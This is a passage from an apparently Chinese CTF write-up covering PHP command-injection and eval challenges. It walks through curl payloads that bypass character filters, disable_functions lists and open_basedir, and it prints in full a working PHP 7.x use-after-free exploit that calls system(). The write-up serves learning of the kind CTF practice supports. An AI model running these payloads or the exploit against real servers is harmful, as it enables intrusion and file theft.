|           | 处理方式            |
| --------- | --------------- |
| 无filename | $\_POST\['f'\]  |
| 有filename | $\_FILES\['f'\] |
第二行的类型其实无伤大雅
#### 2. boundary
当然boundary也有要求
1. 不能出现在任何部件的内容里
2. 长度不超过70个字符
3. 头boundary和body里分隔符必须相同

了解了这么多之后终于要发送了
实际上我们不需要真的发这么长一串（当然如果你想用BP的话也不是不可以)

```bash
echo ls -la .; ls -la / > x.txt
curl -g -F "f=@x.txt" "https://.../?c=.%20/???/????????[@-[]"
```
`[@-[]`：把 `/etc/protocols`、`/etc/profile.d` 这类末位是小写的同长度文件排掉

之后我们回显了
```bash
total 20
drwxrwxrwx    1 www-data www-data      4096 Nov  3 11:22 .
drwxr-xr-x    1 root     root          4096 Oct 31  2019 ..
-rw-r--r--    1 www-data www-data       278 Nov  3 11:22 flag.php
-rw-r--r--    1 www-data www-data       448 Sep  7  2020 index.php
/:
total 72
drwxr-xr-x    1 root     root          4096 Nov  3 11:22 .
drwxr-xr-x    1 root     root          4096 Nov  3 11:22 ..
...
```
显然我们cat
```bash
echo cat flag.php > y.txt
curl -g -F "f=@y.txt" "https://.../?c=.%20/???/????????[@-[]"
```
就成功了（当然你如果发出第一遍的时候没有回显可能是碰到了别的文件再发一遍就行了）

我们最后来看看curl到底为你做了什么事情——它自己挑了一个boundary，拼body，算content-length，写content-type 最后用POST发。我的天哪，简直全自动了，太方便了！

```bash
curl -g -F "f=@x.txt" "https://.../?c=..."
```
`-g` 是 `--globoff`，关闭 curl 自己的通配解析，否则 URL 里的 `[@-[]` 会被 curl 先处理掉
`-F` 是 `--form` 表示这次用 multipart/form-data来发送
`f=@x.txt` 这个 `@` 的有无决定了它是否有 filename ——即是否按 `$_FILES['f']` 发送并在 PHP 里新建临时文件，比如如果是 `f=hello` 就会按 `$_POST['f']` 来发送

这样就说好了

### pt.4.8

啊啊啊啊啊有完没完啊
```php
// 还能炫的动吗？  
//flag in 36.php  
if(isset($_GET['c'])){    $c=$_GET['c'];  
    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){        system("cat ".$c.".php");
```

看上去我们只要做到 `?c=36` 就可以了，但是如何写出这个 36 可是一个问题
我们要知道的知识点是
> `$((  ))` 在shell里是算术展开，结果是十进制的数字字符串可以直接作为文件名的一部分

此外，如何拿到数字呢？
> `$$` = 当前 shell 的 PID （数字）

也就是说，`$$/$$ = 1` ，那变成36不是简简单单，直接暴力一波，36个加起来就行了...吗？
我们看我们在网页上发出去的式子
```php
/?c=$(($$/$$+$$/$$.....))
```
看上去是没有问题的，但是实际上我们交上去的时候，会发现没有回显——显然是被PHP给过滤了。
问题出在哪里呢？
！！！原来如此，我们注意这个加号 `+` ，虽然它在 URL 里是完全合法的字符，但是在PHP解码这个`+`的时候，把它解码成了空格（这是查询串(form-urlencoded)的语义规定，+ 就是空格）
也就是说，因为 + 在URL合法存在，所以它不会被URL编码成%2B，我们只能手动编码，当然你如果要在网站的路径上这么打

其实你真要这么打也是可以的
```php
/?c=$(($$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$%2B$$/$$))
```
怪好看的

所以，我们要采用直截了当的方式，直指要害，这里依旧使用 curl
```bash
curl -s -G --data-urlencode "c=$(($$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$+$$/$$))" "https://xxx.ctf.show/"
```
这里面的意思
`-s` 关闭错误输出，实际上不加也可以
`-G` 把后面的 `--data-urlencode` 的数据（就是c=\$((叽里呱啦很长一串)) ）拼接到URL的查询串，可以理解为以GET形式发送，没有 `-G`就会以POST请求发送
`--data-urlencode "c=$(($$/$$+$...))"` 把右边的值做一次URL编码



### pt.5.1

Re:从零开始的的PHP生活
```php
// 你们在炫技吗？
if(isset($_POST['c'])){        $c= $_POST['c'];  
        eval($c);  
}else{    highlight_file(__FILE__);  
}
```
入门题吧，没有任何限制，但是唯一和之前都不一样的是，这一次我们要用POST请求去发了，那么这边接下来会使用 `curl` 来发送请求
`为什么不用BP是因为好像试了好多次BP用POST发都失败了...我也不知道为什么，没事用curl也算多一个技能吧`

我们上面刚刚学到了如何发 POST 对吧
```bash
curl --data-urlencode "c=system('cat flag.php');" "http://.../"
```
但是可惜的是返回了
```http
<br />
<b>Warning</b>:  system() has been disabled for security reasons in <b>/var/www/html/index.php(17) : eval()'d code</b> on line <b>1</b><br />
```
system函数是被禁用的（虽然表面看不到但是实际上确实是这样的）

那么我们如何读取禁用名单呢？把c里面的内容改成
```bash
"c=print_r(ini_get('disable_functions'));"
```
其中的 `ini_get` 是读取PHP 当前生效的配置项值，在这里，里面填 `disable_functions` 就是查找禁用的函数
当我们在源码中并没有找到过滤的名单的时候，这个时候我们就要去主动寻找，而上面的就是一个不错的方法

我们可以得到
```bash
phpinfo,apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system
```

我们发现所有的执行函数都被ban了，但是读文件的函数都没有ban，那我们直接 readfile
```bash
curl --data-urlencode "c=readfile('flag.php');" "https://.../"
```
就可以了


加强之后在原本的过滤器上又添加了两个
```bash
file_get_contents,readfile
```
那我们换一个读取的函数，曲线救国

```bash
curl --data-urlencode "c=highlight_file('flag.php');" "https://.../"
```
>别忘了highlight也是可以的

甚至增加了过滤
```bash
fread,fgets,fgetss,file,readfile,fpassthru,parse_ini_file,copy,rename,fopen,fgetc,serialize
```
也是可行的，依旧一招鲜吃遍天

真的能过好多...我看看刚刚已经过了这么多的黑名单了
```bash
debug_backtrace,getTrace,gc_collect_cycles,phpinfo,apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system,file_get_contents,error_reporting,error_log,file_put_contents,fclose,fwrite,tempnam,curl_init,fsockopen,readfile,fread,fgets,fgetss,file,readfile,fpassthru,parse_ini_file,copy,rename,fopen,fgetc,serialize
```


### pt.5.2

这关筛了
```bash
show_source,include,include_once,require,require_once,debug_backtrace,getTrace,gc_collect_cycles,phpinfo,apache_child_terminate,apache_setenv,chgrp,chmod,chown,curl_exec,curl_multi_exec,dl,exec,imap_mail,imap_open,ini_alter,ini_restore,ini_set,link,mail,openlog,parse_ini_file,passthru,pcntl_alarm,pcntl_exec,pcntl_fork,pcntl_setpriority,pcntl_signal,pcntl_signal_dispatch,pcntl_sigprocmask,pcntl_sigtimedwait,pcntl_sigwaitinfo,pcntl_wait,pcntl_waitpid,pcntl_wstopsig,pcntl_wtermsig,popen,posix_kill,proc_get_status,proc_open,proc_terminate,putenv,readlink,shell_exec,symlink,syslog,system,file_get_contents,error_reporting,error_log,file_put_contents,fclose,fwrite,tempnam,curl_init,fsockopen,readfile,fread,fgets,fgetss,file,readfile,fpassthru,parse_ini_file,copy,rename,fopen,fgetc,serialize
```
把show_source筛了关我highlight_file什么事情？

```bash
C:\Users\yu>curl --data-urlencode "c=highlight_file('flag.php');" "https://...../"
<code><span style="color: #000000">
<br /></span><span style="color: #0000BB">$flag</span><span style="color: #007700">=</span><span style="color: #DD0000"><br /></span> 不在这里"</span><span style="color: #007700">;
</span>
</code>
```
666还有第二关，竟然变难了？！
难不倒我

我们需要一个函数来帮助我们打印出目录
> `print_r` 可以打印命令的结果
>  `scandir('.')` 列出当前目录，当然你把 `.` 换成 `..` 就是上级目录

有了这两个工具我们就可以查看目录了
最后在可能是根目录吧找到了
```bash
curl --data-urlencode "c=print_r(scandir('../../..'));" "https://.../"
Array
(
    [0] => .
    [1] => ..
    [2] => .dockerenv
    [3] => bin
    [4] => dev
    [5] => etc
    [6] => flag.txt
    [7] => home
```

可能会有疑惑这个highlight_file也可以读根目录的flag.txt吗？可以的兄弟
我们只需要打
```bash
curl --data-urlencode "c=highlight_file('../../../flag.txt');" "https://.../"
```
就行了，可以说非常简单

然后我们下一题甚至把 `print_r` ban了，虽然highlight_file 可以，但是现在就是纯黑盒测试了，不过聪明的我们也是仿造了上面的命令找到了flag
```bash
curl --data-urlencode "c=highlight_file('../../../flag.txt');" "https://.../"
```
没想到吧这个flag也是放在了根目录的

### pt.5.3

下一道题甚至把 `highlight_file` 给ban了，甚至页面都加载不出来了...
```php
**Warning**: highlight_file() has been disabled for security reasons in **/var/www/html/index.php** on line **19**
```

还记得我们之前学习了 `include()` 可以把指向的文件中的PHP语言部分作为PHP语言执行，而非PHP则会作为HTML的格式输出
我们用那我们就用include

```bash
curl --data-urlencode "c=include('flag.php');" "https://.../"
# 无回显，说明是一个不echo的 PHP文件，我们盲猜位置和上道题是一样的
curl --data-urlencode "c=include('../../../flag.txt');" "https://.../"
```
就可以了

当然如果你要硬取看看这个 `flag.php` 它到底存不存在也是可以的。我们只要
```bash
curl --data-urlencode "c=echo include('flag.php');" "https://.../"
```
如果返回了 `1` 。说明文件是存在的，只是在文件里面只有赋值没有 echo，导致这个文件本身并不输出内容。

### pt.5.4

好的针对之前的黑盒测试，这么下去显然是不可取的，于是出题人大大非常好心地给了我们index的源码
```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
```

可能你还不知道这里多了几行代码是什么意思，我们不妨测试一下
```bash
<?>???????</?>:  ???_???() ??? ???? ???????? ??? ???????? ??????? ?? <?>/???/???/????/?????.???</?> ?? ???? <?>??</?><?? />
???????{????????-????-????-????-????????????}

你要上天吗？
```
显然那个大括号就是flag，但是怎么全都变成了 `?`

原来是最后的
```php
        $s = ob_get_contents(); //$s = eval($c) 的内容
        ob_end_clean();  //缓冲区清空
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
```
把真正的内容给全都替换成了 `?`

那我们来具体看看其中的流程是怎么样的
>这串代码我们并不能看到缓冲区什么时候设立的，因为正常的 `eval()` 函数不会单独设置缓冲区，只有 `ob_start()` 这个函数才代表着缓冲区设置（而这里给到我们的代码没有读到就是了），但是我们既然可以看到整道题存在着缓冲区，那它肯定已经在前面打开了。而 `ob_get_contents` 只是读取输出缓冲区的内容，eval其实一输出就到缓冲区了。

因此，我们要想这串内容不经过缓冲区，要么就是在请求体里面关闭缓冲区设置，要么就是直接`exit(0)` 。这样就能在经过缓冲区之前直接关闭整个脚本，也就是 `$s` 根本就没有被赋值，在这之前，程序就关闭了

也就是最后的payload
```bash
curl --data-urlencode "c=include('../../../flag.txt');exit(0)" "https://.../"
```
### pt.5.5 open_basedir 沙箱绕过

看似和5.4差不多实际上这个难度真的有点大
我们同样也拿到了这道题的附件
```php
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
?>
你要上天吗？
```

~~这道题和上道题的难度完全不是一个档次的，所以如果你觉得有些难以理解，请耐心看完。~~

我们先来访问 `flag.php` ，用之前 5.3 的办法
```bash
curl --data-urlencode "c=echo include('flag.php');echo $flag;exit(0);" "https://.../"
```
但是返回了
```bash
1秀秀得了,这次不在这里
```

那万一在根目录呢？但是flag.txt访问不到，于是我们scandir看看里面到底有什么东西（因为print_r用不了，所以用 echo）
```bash
curl --data-urlencode "c=echo scandir('/');exit;" "https://.../"
```

但是这道题却报错了，除去那些无关紧要的筛选报错，我们看到了非常关键的一条
```bash
<b>Warning</b>:  scandir(): open_basedir restriction in effect. File(/) is not within the allowed path(s): (/var/www/html/) in <b>/var/www/html/index.php(19) : eval()'d code</b> on line <b>1</b><br />
```

什么叫这个路径不允许访问？我们被 `sandbox` 了！这道题分明就是 **PHP 应用层的文件系统沙箱** 我们要逃逸~

既然发现了是沙箱，那我们要来确定这个沙箱是用什么筑起来的，然后才能判断沙箱逃逸的难度

沙箱的名字，想必已经知道了，就是 `open_basedir` ，它在文件系统层面给PHP限制，让它只能在圈定的范围内读写文件。如何去看到它的圈定范围，一般配置会放在php.ini
例如
```ini
open_basedir = /var/www/html:/tmp
```
这表示 PHP 脚本只能访问 /var/www/html 和 /tmp 及其子目录

当然撑起 `open_basedir` 的载体只有四种

| 载体                                    | 怎么判断                              |
| ------------------------------------- | --------------------------------- |
| php.ini（php的主配置文件）                    | `get_cfg_var()` 有值                |
| Apache vhost 的 `php_admin_value`      | `get_cfg_var()` 无值但 `ini_get()` 有 |
| PHP-FPM pool 的 `php_admin_value[...]` | 同上 且SAPI 是 `fpm-fcgi`             |
| `.user.ini`（目录级）                      | `user_ini.filename` 非空 + 文件存在     |
这道题我们先打一发php.ini的探针（一般来说都是这个）
```bash
curl --data-urlencode "c=echo var_export(get_cfg_var('open_basedir'),true);exit(0);" "https://.../"
```
返回
```bash
'/var/www/html/'
```
那结果很明显了，就是 `php.ini` 。

现在我们已经确定了沙箱是以 `php.ini` 为载体的 `open_basedir` ，边界就是 `/var/www/html/`
那么既然是沙箱绕过，网上肯定有它的 `PoC` ，唯一还需要知道的是环境变量，也就是它的版本

```bash
curl --data-urlencode "c=echo PHP_VERSION;exit(0);" "https://.../"
```
返回
```bash
7.3.11
```
那么接下来我们知道了PHP的版本是 7.3.11 就万事大吉了

我们根据搜索发现了在该版本下面，`glob://` 作为流包装器（和 `file://` `php://` `data://` 一类），可以绕过。但是实际上 `file://` `php://filter` `data://` 也不行，是因为它是普通的文件包装器，最终都要调用同一个打开文件的底层函数，碰真实的文件，而 `glob://` 它只枚举名字，调用的是系统的 `glob()` 函数，不打开文件，这是老版本漏掉的流，也是这道题的关键，让我们绕过沙箱去窥探外面的文件到底是什么样子的。

完整的payload就是
```bash
curl --data-urlencode "c=foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename(),' ';}exit(0);" "https://.../"
```

c里面其实是一串PHP代码
```php
foreach (new DirectoryIterator('glob:///*') as $f) {   // 1. 写一个可迭代对象，然后逐项循环
    echo $f->getFilename(), ' ';                        // 2. 每项取名字，空格分开
}
exit(0); 
```
当然如果想展开里面的函数，看得清楚点也是可以的
```php
$a = new DirectoryIterator('glob:///*');
foreach ($a as $f) {
    echo $f->getFilename(), ' ';
}
exit(0);
```

当然这里面可能有一些不太了解的词汇，我们来解读一下：
`foreach` 是遍历数组 `(... as $f)` 左边是遍历的表达式，而 `$f` 是每一轮的变量 `new` 是将对象实例化，`DirectoryIterator('glob:///*')` 是建一个目录迭代器，用来遍历一个目录下所有文件和子目录，`{ }` 大括号里的内容每次每一轮执行一次，然后 `->` 是调用方法，这里就是调用 `getFilename()` — 返回文件名（不含目录） ，其实你可以把`getFilename()` 作为之前`DirectoryIterator()` 函数的调用方式，当然你在`DirectoryIterator()` 函数下不只有这个函数，还有`getPathname()` 完整路径（/var/www/html/flag.php） ，`getExtension()` 是文件扩展名等等。然后后面的 `' '` 是打印一个空格。

你最后就可以得到
```bash
bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
```
到这里，我们终于看到了flag的位置，以及名字，接下来就是尝试去读取文件了。

现在在 PHP 层面我们已经无法调用读取的函数了，我们只能往更深处走，利用 PHP 7.3.11 的漏洞，绕过 `disable_functions` 的黑名单，在内存层面劫持执行流，也就是劫持 PHP 内部的函数调用指针去让它执行 `system()` 函数

这就是 UAF use-after-free，就是虽然内存被释放了，但是指针还指着被释放的内存——这就是悬空指针。
危害程度取决于这块内存接下来会做什么：如果没人被分配，只是读到残留数据还好。但是如果被重新分配了，就会读到别人的数据，例如
```c
char *p = malloc(64);      // 地址 A
free(p);                   // A 还回去
char *q = malloc(64);      // 分配器很可能把 A 又给 q！
strcpy(q, "secret");       // A 里现在是 "secret"
printf("%s", p);           // 通过旧指针 p 读到 "secret"
```
更严重一些，如果内存指向的是攻击者恶意指向的内存中的函数指针呢？控制流就很有可能被劫持

这就是这道题的关键点，当然接下来我们贴出的 UAF 是网上流传的，可能对新生理解不太友好，那我们接下来的讲解主要是以讲解函数的操作为主，不需要完完全全背下整个代码

看一眼下面的 UAF之后我们再往上看到这里的解释：
整个流程就是：退内存，然后留住内存的指针，然后把指针指向我们想要的地址，执行

而 function 里的 `__destruct()` 保留了指针
```php
            global $backtrace; 
            unset($this->a);  //退内存
            $backtrace = (new Exception)->getTrace(); # ;) // 指针被异常回溯收走
```

接下来我们看到下面的 `trigger_uaf`
```php
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };
```
这里的重点在头尾这两行，第一行的意思是调用了函数，函数内部 `new Vuln()` 于是内存被释放，而最后一行则是匿名函数占用了这块内存，而这里的 `$abc` 则是傻大个，自己以为自己指向的内存还是原来的内容，殊不知里面的内容在这里就偷梁换柱了

接下来我们再来看到 `leak()` 和 `write()` 来看看是怎么变成 读任意地址 的。
我们首先要知道 **PHP的字符串在内存里有两个字段，分别是长度和指向内容的指针。`strlen()` 就是读取长度** ，而 `leak()` 做的就是把指针改到 `目标地址 - 0x10` 的位置，于是 长度 字段就大概率能写在目标地址上（当然脚本靠 `$n_alloc` 来预铺内存提高概率），访问 `strlen()` 的时候读到的就是地址里面的 8个字节。之后的 `write()` 虽然只能写 `$abc` 所在的内存，但是它会有概率让闭包对象成为我们要的长度 。证明它是不是很简单，只要 `strlen()` 就可以了，只有长度不为 79（原长，相当于没改）或0 的时候才算赢，这也就是为什么会有
```php
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
```

接下来这里的的 `$abc` 是一块别人的内存 
```php
$closure_handlers = str2ptr($abc, 0);
$php_heap = str2ptr($abc, 0x58);
$abc_addr = $php_heap - 0xc8;
$closure_obj = str2ptr($abc, 0x20);
```

| 内容                    | 得到了         | 作用                                    |
| --------------------- | ----------- | ------------------------------------- |
| `str2ptr($abc, 0)`    | handlers 指针 | 后面顺着它找到 PHP 程序                        |
| `str2ptr($abc, 0x58)` | 堆指针         | 减 `0xc8` 算出 `$abc_addr`——**自己这块内存在哪** |
| `str2ptr($abc, 0x20)` | 真闭包对象的指针    | 最后复制它造假闭包                             |
接下来我们细读 `leak()`
```php
function leak($addr, $p = 0, $s = 8) {
    write($abc, 0x68, $addr + $p - 0x10);
    $leak = strlen($helper->a);
    ...
}
```
其中的 `0x68` 是假字符串的 数据指针 ， `-0x10` 是跳过 `zend_string` 头， `strlen()` 读长度字段，来把字段压到目标地址上

接下来就是找 `system()` 然后再骗 PHP 去调用它，我们可以大概画出程序在内存的样子
```
┌───────────────────────────┐ ← 基址：ELF 头（魔数 7f 45 4c 46）
│ ELF 头：描述整个文件结构     │
│ 程序头表：说明有哪些段        │
├───────────────────────────┤
│ text 段：机器码（可执行）     │
├───────────────────────────┤
│ data 段：可读写的数据         │
│   ┌─────────────────────┐  │
│   │ 函数表               │  │
│   │ 每项 0x20 字节：      │  │
│   │ [名字指针 | handler] │  │
│   │ ...                 │  │
│   │ "system" | zif_system│  │ ← 我们要找的
│   └─────────────────────┘  │
└───────────────────────────┘
```

而对应的函数就是
```bash
$binary_leak = leak($closure_handlers, 8);   //找到程序开头
$base = get_binary_base($binary_leak);   
$elf = parse_elf($base);     // 读 ELF 的程序头，找出可读字段
$basic_funcs = get_basic_funcs($base, $elf);   // 在 data 段里扫"constant"和"bin2hex"两个紧挨着的名字，认出表的起点
$zif_system = get_system($basic_funcs);  //找 system
```

我们成功拿到地址了，接下来就是让 PHP 去调用它
PHP 不让你调用地址，但是可以用 **闭包** ：在内存里有一个字段写着 该调用哪个函数（这里的 `0x68` 偏移）
```
真闭包： [对象头][ 类型=用户函数 | handler=你的匿名函数 ]
                                   ↓ 复制一份
假闭包： [对象头][ 类型=内置函数 | handler=zif_system 的地址 ]
```

脚本的最后8行就是更改地址的
```php
// 1. 把真闭包复制到 0xd0 处（保留对象头等 PHP 需要的字段）
for($i=0;$i<0x110;$i+=8) write($abc, 0xd0+$i, leak($closure_obj,$i));
// 2. 改类型：1 = 内置函数
write($abc, 0xd0+0x38, 1, 4);
// 3. 改 handler：指向 system 的实现
write($abc, 0xd0+0x68, $zif_system);
// 4. 让 $helper->b 指向这个假对象
write($abc, 0x20, $abc_addr+0xd0);
// 5. 调用
($helper->b)($cmd);
```

总而言之整个流程就是：泄露一个指针，认出ELF 找到data段，认出函数表，找到system 的位置，拿到地址，复制闭包，改 handler，调用。


UAF
```php
?><?php
pwn("ls /;cat /flag0.txt");

function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf('%c',$ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf('%c',$v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ($helper->b)($cmd);
    exit();
}
```



### pt.5.6

算是黑暗后的黎明吧（骗你的是黑暗前的黎明），题目强度明显小了
源码和之前两道应该是一样的，同时没有了沙箱，但是黑名单还是在的。
于是
```php
curl --data-urlencode "c=foreach(new DirectoryIterator('/') as $f){echo $f->getFilename(),' ';}exit(0);" "https://.../"
```
具体为什么是这样呢可以往上看看，为什么 ban 不掉这个 `DirectoryIterator` 是因为他本身就不属于函数表的部分，不在三界之中。
```bash
srv usr root media .. lib sys var opt proc home bin dev mnt run sbin tmp etc . flagx.txt .dockerenv
```
找到了flagx.txt 就include了


### pt.5.7 PDO + load_file 跨进程读文件

常规开局
```bash
curl --data-urlencode "c=foreach(new DirectoryIterator('glob:///*') as $f){echo $f->getFilename(),' ';}exit(0);" "https://.../"
```
返回
```bash
bin dev etc flag36.txt home lib media mnt opt proc root run sbin srv sys tmp usr var
```
读
```bash
curl --data-urlencode "c=include('/flag36.txt');exit;" "https://.../"
```
但是不一样的是
```bash
<b>Warning</b>:  include(): open_basedir restriction in effect. File(/flag36.txt) is not within the allowed path(s): (/var/www/html/) in <b>/var/www/html/index.php(19) : eval()'d code</b> on line <b>1</b><br />
```

何意味，还有沙箱？我们先看看禁用名单看看新加了什么
```
......strlen ord bin2hex hex2bin dechex chr scandir
```
然后我们看看沙箱到哪了
```bash
curl --data-urlencode "c=echo var_export(get_cfg_var('open_basedir'),true);exit(0);" "https://.../"
'/var/www/html/'
```
还是老地方，但是之前UAF的路是不能走了，那我们要思考，实例中还有哪个进程可以读文件的？

这边列出加载了的扩展
```bash
curl --data-urlencode "c=echo implode(' ', get_loaded_extensions());exit(0);" "https://.../"

Core date libxml openssl pcre sqlite3 zlib ctype curl dom fileinfo filter ftp hash iconv json mbstring SPL PDO pdo_sqlite session posix readline Reflection standard SimpleXML Phar tokenizer xml xmlreader xmlwriter mysqlnd cgi-fcgi mysqli pdo_mysql sodium
```

发现了一些关键的线索，怎么一个php的系统还连上了sql呢？这里就要介绍一个 PDO 了
>PDO (PHP Data Objects) 的缩写，是 PHP 官方提供的一套轻量、统一的数据库访问方式。简单说，它让你用同一套代码风格去连接和操作不同类型的数据库，而不必为 MySQL、PostgreSQL、SQLite 各学一套完全不同的函数。

